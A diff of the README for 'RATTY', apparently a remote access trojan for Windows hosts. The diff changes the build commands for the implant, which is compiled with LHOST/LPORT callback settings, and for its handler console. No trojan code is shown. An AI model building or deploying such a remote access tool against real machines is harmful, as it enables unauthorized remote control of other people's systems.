@@ -12,9 +12,9 @@ liability for misuse or damage caused by improper or unlawful use of this softwa
 
 ## Prepare RATTY :rat:
 ```bash
-mkdir build
-cd build
-LHOST=127.0.0.1 LPORT=4444 cmake ../ && make ratty
+mkdir build; cd build
+mkdir ratty; cd ratty
+LHOST=127.0.0.1 LPORT=4444 cmake ../../ && make ratty
 ```
 To activate RATTY, simply execute the exe on a Windows Host via:
 ```powershell
@@ -23,9 +23,9 @@ To activate RATTY, simply execute the exe on a Windows Host via:
 
 ## Prepare RATTY Handler :computer:
 ```bash
-mkdir build
-cd build
-LHOST=127.0.0.1 LPORT=4444 cmake ../ && make ratconsole
+mkdir build; cd build
+mkdir ratconsole; cd ratconsole
+cmake ../../src/handler && make ratconsole
 ```
 To use the Handler:
 ```powershell
